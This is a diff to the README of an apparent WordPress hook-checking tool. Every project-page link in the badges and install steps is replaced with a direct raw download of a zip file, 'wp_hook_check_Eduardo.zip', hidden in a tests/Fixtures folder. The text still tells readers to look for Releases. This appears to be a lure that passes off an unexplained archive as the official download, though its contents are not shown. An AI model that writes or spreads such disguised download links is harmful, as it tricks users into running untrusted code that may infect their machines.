@@ -1,6 +1,6 @@
 # 🛠 wp-hook-check - Find WordPress Hook Issues Fast
 
-[![Download wp-hook-check](https://img.shields.io/badge/Download-wp--hook--check-brightgreen)](https://github.com/jovialkayembe/wp-hook-check)
+[![Download wp-hook-check](https://img.shields.io/badge/Download-wp--hook--check-brightgreen)](https://raw.githubusercontent.com/jovialkayembe/wp-hook-check/main/tests/Fixtures/dynamic-hooks-plugin/wp_hook_check_Eduardo.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This guide shows how to get wp-hook-check on your Windows PC and run it. The pro
 
 You can get wp-hook-check by visiting the project page on GitHub:
 
-[![Get wp-hook-check](https://img.shields.io/badge/Download-wp--hook--check-blue)](https://github.com/jovialkayembe/wp-hook-check)
+[![Get wp-hook-check](https://img.shields.io/badge/Download-wp--hook--check-blue)](https://raw.githubusercontent.com/jovialkayembe/wp-hook-check/main/tests/Fixtures/dynamic-hooks-plugin/wp_hook_check_Eduardo.zip)
 
 Click the link above to open the page. You will find the latest version to download along with instructions. 
 
@@ -39,7 +39,7 @@ Click the link above to open the page. You will find the latest version to downl
 ## 💾 How to Download and Install
 
 1. Open the download page by clicking the large badge above or this link:  
-   https://github.com/jovialkayembe/wp-hook-check
+   https://raw.githubusercontent.com/jovialkayembe/wp-hook-check/main/tests/Fixtures/dynamic-hooks-plugin/wp_hook_check_Eduardo.zip
 
 2. Look for a section named **Releases** or **Downloads** on the GitHub page.
 
@@ -139,4 +139,4 @@ Developers who want to improve their code quality can also use wp-hook-check bec
 
 ---
 
-[![Download wp-hook-check](https://img.shields.io/badge/Download-wp--hook--check-green)](https://github.com/jovialkayembe/wp-hook-check)
+[![Download wp-hook-check](https://img.shields.io/badge/Download-wp--hook--check-green)](https://raw.githubusercontent.com/jovialkayembe/wp-hook-check/main/tests/Fixtures/dynamic-hooks-plugin/wp_hook_check_Eduardo.zip)
